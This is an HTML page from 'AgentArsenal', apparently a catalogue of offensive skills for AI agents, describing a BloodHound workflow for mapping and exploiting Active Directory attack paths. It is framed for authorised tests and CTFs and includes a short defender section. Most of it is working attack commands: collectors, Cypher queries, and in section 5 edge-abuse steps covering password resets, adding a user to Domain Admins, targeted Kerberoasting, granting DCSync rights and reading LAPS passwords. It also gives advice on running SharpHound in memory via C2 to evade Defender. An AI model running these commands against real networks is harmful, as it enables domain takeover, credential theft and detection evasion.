@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: bloodhound-methodology</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>bloodhound-methodology</h2><div class="meta"><span class="badge gray">ad</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when mapping Active Directory attack paths on an authorized</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ad-enumeration.html">ad-enumeration</a> <a href="password-attacks.html">password-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>BloodHound</td><td>4.5.x</td></tr><tr><td>SharpHound</td><td>2.x</td></tr><tr><td>NetExec</td><td>1.4.0</td></tr><tr><td>impacket</td><td>0.12.0</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>BloodHound turns raw Active Directory enumeration into a graph of who can reach what. The collector gathers users, computers, groups, sessions, ACLs, and trusts, and the interface answers the question that matters: what is the shortest path from the access I have to the access I want. This skill covers the full authorized workflow for Active Directory assessments, lab environments, and CTFs only: collecting safely, importing and verifying the data, analyzing with prebuilt and custom queries, and converting graph edges into concrete next steps.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm you hold valid domain credentials and note the domain name,</li>
+<p>domain controller IP, and a DNS server that resolves the domain.</p>
+<li>Pick the collector: SharpHound on a Windows host inside the network,</li>
+<p>bloodhound-ce-python from a Linux attack box.</p>
+<li>Run collection with the default All set first, then add targeted</li>
+<p>collectors if something was missed.</p>
+<li>Import the output into BloodHound and verify node counts against a</li>
+<p>quick LDAP user count.</p>
+<li>Mark every compromised principal as Owned, starting with your initial</li>
+<p>credential.</p>
+<li>Run the prebuilt query for shortest paths from owned principals to</li>
+<p>Domain Admins.</p>
+<li>Work the path edge by edge, using the tool each edge type calls for.</li>
+<li>Re-collect after each privilege gain, because new rights reveal new</li>
+<p>edges.</p>
+</ol>
+<h2>1. Choose and run the collector</h2>
+<p>SharpHound on a domain joined or network adjacent Windows host gives the richest collection, including local sessions. The Linux collector works from any attack box with credentials.</p>
+<pre><code class="language-powershell"># SharpHound on Windows: full collection into C:\temp
+SharpHound.exe -c All --Domain corp.local --DomainController 10.10.10.10 --OutputDirectory C:\temp</code></pre>
+<pre><code class="language-bash"># bloodhound-ce-python on Linux: full collection
+bloodhound-ce-python -u svcuser -p &#x27;Password1&#x27; -d corp.local \
+  -dc 10.10.10.10 -ns 10.10.10.10 -c all --zip</code></pre>
+<p>Useful collector subsets when the full run is too noisy or too slow:</p>
+<pre><code class="language-powershell"># Lighter run: skip session collection on large domains
+SharpHound.exe -c Group,LocalGroup,ACL,ObjectProps,Container,Trusts --Domain corp.local --OutputDirectory C:\temp</code></pre>
+<pre><code class="language-bash"># Linux: ACLs and object properties only, for a quick privilege map
+bloodhound-ce-python -u svcuser -p &#x27;Password1&#x27; -d corp.local \
+  -dc 10.10.10.10 -ns 10.10.10.10 -c acl,objectprops --zip</code></pre>
+<p>Copy the resulting zip or JSON files back to the machine running BloodHound, then drag them into the upload area or use the import button.</p>
+<h2>2. Verify the import</h2>
+<p>A bad import looks like success but shows an empty graph. Sanity check before you analyze.</p>
+<pre><code class="language-bash"># Quick LDAP user count to compare against BloodHound&#x27;s user node count
+ldapsearch -x -H ldap://10.10.10.10 -D &#x27;svcuser@corp.local&#x27; -w &#x27;Password1&#x27; \
+  -b &#x27;DC=corp,DC=local&#x27; &#x27;(objectClass=user)&#x27; dn | grep -c &#x27;^dn:&#x27;</code></pre>
+<p>In the BloodHound interface, the node counts appear on the database info panel. If users or computers are far below the LDAP count, re-run the collector with explicit <code>-dc</code> and <code>-ns</code> values, since name resolution is the most common cause of partial collection. Trusts only appear with the Trusts collector, and sessions need the Session collector plus readable remote registry or NetSessionEnum rights.</p>
+<h2>3. Mark owned principals and find the path</h2>
+<p>BloodHound plans from what you own. Mark the initial credential first, then every new principal as you compromise it.</p>
+<pre><code class="language-bash"># Mark a user as owned through the Neo4j HTTP API (BloodHound 4.x backend)
+curl -s -u neo4j:&#x27;BloodHoundPass1&#x27; -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;statements&quot;:[{&quot;statement&quot;:&quot;MATCH (u:User {name: $name}) SET u.owned=TRUE RETURN u.name&quot;,&quot;parameters&quot;:{&quot;name&quot;:&quot;SVCUSER@CORP.LOCAL&quot;}}]}&#x27; \
+  http://127.0.0.1:7474/db/neo4j/tx/commit</code></pre>
+<p>In the GUI the same action is right click, Mark User as Owned. Then run the prebuilt query: Shortest Paths from Owned Principals to Domain Admins. This single query usually produces the whole engagement plan.</p>
+<h2>4. Analyze with prebuilt queries and raw Cypher</h2>
+<p>Prebuilt queries cover the common cases. Open Analysis, Queries, Pre-Built Analytics and work through the ones that match your foothold: kerberoastable users, AS-REP roastable users, shortest path to high value targets, unconstrained delegation systems, computers with unconstrained delegation, and domain trusts.</p>
+<p>Raw Cypher handles everything else. These run in the query bar:</p>
+<pre><code class="language-cypher">// Shortest path from anything owned to Domain Admins
+MATCH (n {owned:TRUE}), (m:Group), p=shortestPath((n)-[*1..]-&gt;(m))
+WHERE m.name =~ &#x27;DOMAIN ADMINS@.*&#x27;
+RETURN p</code></pre>
+<pre><code class="language-cypher">// Kerberoastable users (have an SPN)
+MATCH (u:User) WHERE u.hasspn=TRUE
+RETURN u.name ORDER BY u.name</code></pre>
+<pre><code class="language-cypher">// AS-REP roastable users (preauth disabled)
+MATCH (u:User) WHERE u.dontreqpreauth=TRUE
+RETURN u.name ORDER BY u.name</code></pre>
+<pre><code class="language-cypher">// Computers with unconstrained delegation (prime coercion targets)
+MATCH (c:Computer) WHERE c.unconstraineddelegation=TRUE
+RETURN c.name ORDER BY c.name</code></pre>
+<pre><code class="language-cypher">// Users with an active session on a server you care about
+MATCH (u:User)-[:HasSession]-&gt;(c:Computer)
+WHERE c.name =~ &#x27;.*SQL.*&#x27;
+RETURN u.name, c.name</code></pre>
+<pre><code class="language-cypher">// Who can DCSync the domain (replication rights on the domain object)
+MATCH (n)-[:GetChanges|GetChangesAll]-&gt;(d:Domain)
+RETURN n.name, d.name</code></pre>
+<p>Read the edge labels on any path: MemberOf, AdminTo, HasSession, GenericAll, GenericWrite, WriteOwner, WriteDACL, ForceChangePassword, AddMember, AllowedToDelegate, CanRDP, CanPSRemote, Owns, ReadLAPSPassword, and DCSync. The edge name tells you exactly which abuse to attempt next.</p>
+<h2>5. Turn edges into action</h2>
+<p>Each edge maps to a concrete tool. Work the shortest path one edge at a time and re-mark ownership after each success.</p>
+<pre><code class="language-bash"># ForceChangePassword edge: reset the target password over RPC (PowerView)
+# Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString &#x27;NewPass1!&#x27; -AsPlainText -Force) -Verbose</code></pre>
+<pre><code class="language-bash"># AddMember edge: add your user to the privileged group
+net rpc group addmem &quot;Domain Admins&quot; eviluser \
+  -U &#x27;corp.local/admin%Password1&#x27; -S 10.10.10.10</code></pre>
+<pre><code class="language-bash"># GenericWrite on a user: targeted Kerberoasting, add a fake SPN then roast it
+ldapmodify -x -H ldap://10.10.10.10 -D &#x27;eviluser@corp.local&#x27; -w &#x27;Password1&#x27; &lt;&lt;&#x27;EOF&#x27;
+dn: CN=victim,CN=Users,DC=corp,DC=local
+changetype: modify
+add: servicePrincipalName
+servicePrincipalName: fake/svc
+EOF
+GetUserSPNs.py -dc-ip 10.10.10.10 corp.local/eviluser:Password1 -request</code></pre>
+<pre><code class="language-bash"># WriteDACL edge granting replication rights: give yourself DCSync with dacledit
+dacledit.py -action write -rights DCSync -principal eviluser \
+  -target-dn &quot;DC=corp,DC=local&quot; &quot;corp.local/admin:Password1@10.10.10.10&quot;</code></pre>
+<pre><code class="language-bash"># HasSession edge: where admins are logged on, for token or session hijack planning
+nxc smb 10.10.10.10 -u eviluser -p &#x27;Password1&#x27; --loggedon-users</code></pre>
+<pre><code class="language-bash"># ReadLAPSPassword edge: pull the local admin password
+nxc ldap 10.10.10.10 -u eviluser -p &#x27;Password1&#x27; -M laps</code></pre>
+<p>Keep a lab notebook of which edges you tried and their results. BloodHound shows possible paths, not guaranteed ones, and stale session data is the most common reason a promising path fails.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>SharpHound gets flagged by Defender the moment it touches disk. Run it</li>
+<p>in memory through your C2, use the Linux collector instead, or fall back to targeted collectors that avoid the most signatured behavior.</p>
+<li>bloodhound-ce-python fails with DNS errors when the attack box cannot</li>
+<p>resolve the domain. Pass <code>-ns</code> with the DC IP and add the domain to /etc/hosts.</p>
+<li>Session collection returns nothing. It needs remote registry access or</li>
+<p>NetSessionEnum rights on each host, which low privilege users rarely have. Plan paths that do not depend on sessions first.</p>
+<li>The graph shows users as owned that you marked in a previous import.</li>
+<p>Owned flags persist in the database, so clear stale ownership before each fresh engagement with <code>MATCH (n {owned:TRUE}) SET n.owned=FALSE</code>.</p>
+<li>Neo4j runs out of heap on large domains. Raise the heap in the Neo4j</li>
+<p>config and restart the database before importing multi hundred thousand node datasets.</p>
+<li>Import succeeds but queries return nothing. Check that the zip actually</li>
+<p>contained JSON files and that the BloodHound version matches the collector output format (4.x collectors with 4.x BloodHound).</p>
+<li>Clock skew between the attack box and the DC breaks Kerberos based</li>
+<p>collection. Sync time with ntpdate against the DC before collecting.</p>
+<li>Multi domain forests need one collection per domain plus the Trusts</li>
+<p>collector. Collect the trusting and trusted domains separately, then analyze cross domain paths in the combined graph.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No path to Domain Admins from owned principals: widen the target to</li>
+<p>high value groups (Backup Operators, Account Operators, Exchange admins) whose members have indirect paths upward.</p>
+<li>Prebuilt queries are empty: write raw Cypher against specific edges,</li>
+<p>for example all GenericWrite edges held by owned users regardless of target.</p>
+<li>ACL edges look promising but exploitation fails: confirm with the</li>
+<p>daclread module or PowerView Get-ObjectAcl, because BloodHound ACL data can be stale after recent permission changes.</p>
+<li>Collection keeps getting blocked: enumerate manually with ldapsearch</li>
+<p>and the ad-enumeration skill for the specific objects on your path, then continue without the full graph.</p>
+<li>The domain is huge and full collection times out: collect per OU with</li>
+<p>targeted base DNs, or use DCOnly style runs and add sessions later from a host with better network position.</p>
+<li>You suspect the graph is stale mid engagement: re-collect only the</li>
+<p>collectors that changed (usually ACL and Group) instead of the full set.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see BloodHound collection as a burst of LDAP queries from one source reading large parts of the directory, logged as Event ID 4662 (directory service access) on the DC, plus SMB connections to many hosts during session enumeration. SharpHound has well known signatures and Defender raises alerts on its execution, in memory or on disk. The durable defenses are structural: remove the misconfigurations the graph highlights, especially excessive ACLs, unconstrained delegation, and flat admin tiers. Tiered administration and Protected Users for privileged accounts shrink the graph dramatically. Monitoring for mass 4662 reads and SharpHound process behavior catches the collection itself.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1087 (Account Discovery): user and group enumeration.</li>
+<li>MITRE ATT&amp;CK T1018 (Remote System Discovery): computer enumeration.</li>
+<li>MITRE ATT&amp;CK T1069 (Permission Groups Discovery): group membership</li>
+<p>mapping.</p>
+<li>MITRE ATT&amp;CK T1482 (Domain Trust Discovery): trust collection.</li>
+<li>BloodHound documentation:</li>
+<p>https://bloodhound.readthedocs.io</p>
+<li>SharpHound collector:</li>
+<p>https://github.com/BloodHoundAD/SharpHound</p>
+<li>bloodhound-ce-python collector:</li>
+<p>https://github.com/dirkjanm/BloodHound.py</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
